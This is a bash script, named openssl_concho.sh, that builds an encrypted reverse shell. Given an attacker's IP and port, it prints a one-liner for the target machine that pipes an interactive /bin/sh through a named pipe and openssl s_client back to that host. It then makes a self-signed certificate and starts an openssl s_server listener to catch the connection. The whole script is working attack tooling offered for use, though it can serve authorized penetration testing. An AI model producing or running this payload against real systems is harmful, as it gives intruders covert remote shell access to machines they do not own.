#!/bin/bash


#Conchology:
#The scientific study or collection of mollusc shells.

# $1 ip of local machine
# $2 listening port

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Display error if not enough arguments given
if [ $# -ne 2 ]; then
	printf " ${RED}Usage: ${NC} ./openssl_concho.sh [local_ip] [local_listening_port] \n"
	exit 1
fi

conchofilename=$(tr -dc 'A-Za-z' < /dev/urandom | fold -$((RANDOM%10+3)) | head -1)

printf ".. OpenSSL Encrypted RevShell ..\n.-------------------------------.\n"
printf "mkfifo /tmp/$conchofilename; /bin/sh -i < /tmp/$conchofilename 2>&1 | openssl s_client -quiet -no_ign_eof -connect $1:$2 > /tmp/$conchofilename; rm /tmp/$conchofilename\n"
printf ".-------------------------------.\n\n"

printf "\nFollow these instructions to generate a key\nLeaving all fields blank will result in errors\n\n"

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
printf "\n\n${GREEN}Starting encrypted listener on port ${YELLOW}$2${NC}...\n\n"

openssl s_server -quiet -key key.pem -cert cert.pem -port "$2"
